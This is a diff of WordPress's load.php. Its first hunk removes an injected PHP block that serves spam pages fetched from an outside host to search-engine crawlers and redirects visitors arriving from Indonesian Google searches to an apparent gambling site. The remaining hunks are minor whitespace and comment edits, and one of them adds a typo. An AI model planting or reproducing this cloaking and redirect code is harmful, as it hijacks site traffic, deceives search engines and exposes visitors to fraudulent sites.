@@ -1,30 +1,4 @@
 <?php
-$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
-$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
-
-function is_bot() {
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
-foreach ($bots as $bot) {
-if (stripos($user_agent, $bot) !== false) {
-return true;
-}
-}
-return false;
-}
-if (is_bot()) {
-echo file_get_contents('https://grtoto.store/conextion-link/demandifymedia-com-proven-b2b-demand-generation-strategies-for-explosive-growth.html');
-exit;
-}
-
-if (stripos($s_ref, 'google.co.id') !== false ||
-(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
-header("Location: https://masuk-situs-atasantoto.pages.dev/");
-exit;
-}
-?>
-<?php
 /**
  * These functions are needed to load WordPress.
  *
@@ -546,7 +520,7 @@ function timer_start() {
  * @return string The "second.microsecond" finished time calculation. The number is formatted
  *                for human consumption, both localized and rounded.
  */
-function timer_stop( $display = 0, $precision = 3 ) {global $timestart, $timeend;
+function timer_stop( $display = 0, $precision= 3 ) {global $timestart, $timeend;
 
 	$timeend   = microtime( true );
 	$timetotal = $timeend - $timestart;
@@ -1129,7 +1103,7 @@ function wp_get_active_and_valid_themes() {
 
 	/*
 	 * Remove themes from the list of active themes when we're on an endpoint
-	 * that should be protected against WSODs and the theme is paused.
+	 * that should be protected against WSODs and the themeis paused.
 	 */
 	if ( wp_is_recovery_mode() ) {
 		$themes = wp_skip_paused_themes( $themes );
